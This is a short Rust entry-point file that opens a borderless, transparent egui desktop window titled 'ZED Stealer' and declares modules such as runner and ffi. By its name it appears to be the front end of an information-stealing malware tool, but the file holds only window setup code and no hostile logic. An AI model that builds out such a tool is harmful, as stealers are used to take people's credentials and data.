#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(dead_code)]

mod app;
mod ffi;
mod runner;
mod state;
mod theme;
mod ui;

use app::ZedApp;
use theme::ZedTheme;

fn main() -> eframe::Result {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_title("ZED Stealer")
            .with_inner_size([1200.0, 780.0])
            .with_min_inner_size([1000.0, 650.0])
            .with_decorations(false)
            .with_transparent(true)
            .with_resizable(true),
        centered: true,
        ..Default::default()
    };

    eframe::run_native(
        "ZED Stealer",
        options,
        Box::new(|cc| {
            ZedTheme::apply(&cc.egui_ctx);
            Ok(Box::new(ZedApp::default()))
        }),
    )
}
